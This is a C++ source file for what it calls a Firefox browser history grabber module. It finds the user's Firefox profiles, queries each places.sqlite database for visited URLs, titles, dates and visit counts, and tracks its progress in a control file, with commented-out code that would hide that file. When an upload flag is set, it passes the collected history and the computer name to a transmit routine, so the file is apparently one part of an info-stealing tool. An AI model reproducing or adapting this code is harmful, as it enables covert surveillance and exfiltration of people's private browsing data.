/*
    Firefox browser history grabber module;
    Grabs browsing history

    Author: Kulverstukas
*/

#include <sqlite3.h>
#include <vector>
#include <string>
#include <algorithm>
#include <sys/stat.h>
#include <fstream>
#include <iostream>
#include <stdio.h>
#include <time.h>
#include <windows.h>
#include "FFHistory.hpp"
#include "SendData.hpp"

using namespace std;

const string APP_DATA = "appdata";
const string MOZILLA_PROFILES = "\\Mozilla\\Firefox\\";
const string MOZILLA_HISTORY = "places.sqlite";
const string FF_CONTROL_FILE = "ffcontrol.dat";
const string PROFILES_FILE = "profiles.ini";
const string SQL_QUERY = "SELECT url, title, datetime(last_visit_date/1000000, 'unixepoch', 'localtime'), visit_count, last_visit_date FROM moz_places WHERE (last_visit_date > %s) AND (url NOT LIKE \"file:///%%\")";
ofstream outF;
string lastMillis = "";
string outStr;
extern bool upload;

void FFHistory::readFile(bool argv, char* compName) {
    upload = argv;
    string ffGPath = ((string)+getenv(APP_DATA.c_str()))+MOZILLA_PROFILES;
    // create stuff
    vector<FirefoxProfiles> profilePaths;
    readProfiles(ffGPath, &profilePaths);
    SendData sendData;
//    for (int i = 0; i < profilePaths.size(); i++) {
//        printf("%s\n%s\n\n", profilePaths[i].profileName.c_str(), profilePaths[i].profilePath.c_str());
//    }
    string prevNtMillis = "0";

    struct stat buff;
    string ffLPath = ffGPath;
    for (int i = 0; i < profilePaths.size(); i++) {
        // check if control file exists and read it if it does
        string controlF = ffLPath+profilePaths[i].profilePath+"\\"+FF_CONTROL_FILE;
        if (stat(controlF.c_str(), &buff) != -1) {
            ifstream f(controlF.c_str());
            if (f.is_open() and f.good()) {
                getline(f, prevNtMillis);
            }
            f.close();
        }

        ffLPath += profilePaths[i].profilePath+"\\"+MOZILLA_HISTORY;
        if (!upload) {
            outF.open(profilePaths[i].profileName.c_str(), ios::app);
        }
        if (stat(ffLPath.c_str(), &buff) != -1) {
            sqlite3 *dbObj;
            int k = sqlite3_open_v2(ffLPath.c_str(), &dbObj, SQLITE_OPEN_READONLY, NULL);
            if (k == SQLITE_OK) {
                char fQuery[250];
                sprintf(fQuery, SQL_QUERY.c_str(), prevNtMillis.c_str());
                sqlite3_exec(dbObj, fQuery, grabDataCallback, NULL, NULL);
                if (upload) {
                    sendData.transmit("Firefox", compName, profilePaths[i].profileName, outStr);
                } else {
                    outF.close();
                }

                // write to the control file
                if (lastMillis != "") {
                    ofstream of(controlF.c_str());
                    if (of.is_open() and of.good()) {
                        of << lastMillis << endl;
                        //of << 0 << endl;
                    }
                    of.close();
                    int attribs = GetFileAttributes(controlF.c_str());
//                    if ((attribs != FILE_ATTRIBUTE_HIDDEN) and (attribs != FILE_ATTRIBUTE_SYSTEM)) {
//                        SetFileAttributes(controlF.c_str(), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
//                    }
                }
                lastMillis = "";
                ffLPath = ffGPath;
            }
        }
    }
}

void FFHistory::readProfiles(string ffGPath, vector<FirefoxProfiles>* profilePaths) {
    struct stat buff;
    struct FirefoxProfiles ffProf;
    string profF = ffGPath+PROFILES_FILE;
    if (stat(profF.c_str(), &buff) != -1) {
        ifstream f(profF.c_str());
        if (f.is_open() and f.good()) {
            string tmp = "";
            bool put = false;
            while (!f.eof()) {
                getline(f, tmp);
                if (tmp.find("Name=") != string::npos) {
                    ffProf.profileName = ((string)tmp.erase(0,5))+".txt";
                } else if (tmp.find("Path=") != string::npos) {
                    ffProf.profilePath = (string)tmp.erase(0,5);
                    put = true;
                }
                if (put) {
                    profilePaths->push_back(ffProf);
                    ffProf.profileName = "";
                    ffProf.profilePath = "";
                    put = false;
                }
            }
        }
        f.close();
    }

}

int grabDataCallback(void *NotUsed, int argc, char **argv, char **azColName) {
    if (upload) {
        outStr.append("URL:\t"); outStr.append(argv[0] ? argv[0] : "EMPTY"); outStr.append("\n");
        outStr.append("Title:\t"); outStr.append(argv[1] ? argv[1] : "EMPTY"); outStr.append("\n");
        outStr.append("Date:\t"); outStr.append(argv[2] ? argv[2] : "EMPTY"); outStr.append("\n");
        outStr.append("Visits:\t"); outStr.append(argv[3] ? argv[3] : "EMPTY"); outStr.append("\n");
        outStr.append("\n");
    } else {
        outF << "URL:\t" << (argv[0] ? argv[0] : "EMPTY") << endl;
        outF << "Title:\t" << (argv[1] ? argv[1] : "EMPTY") << endl;
        outF << "Date:\t" << (argv[2] ? argv[2] : "EMPTY") << endl;
        outF << "Visits:\t" << (argv[3] ? argv[3] : "EMPTY") << endl;
        outF << endl;
    }
    lastMillis = argv[4];

    return 0;
}

//string ntTimeToPrettyDate(int64_t ntTime) {
//    time_t rawtime = (ntTime/10000000LL)-11644473600LL;
//    struct tm *convertedTime;
//    convertedTime = localtime(&rawtime);
//    char result[22];
//    strftime(result, 22, "%Y.%m.%d, %X", convertedTime);
//    return (string)result;
//}

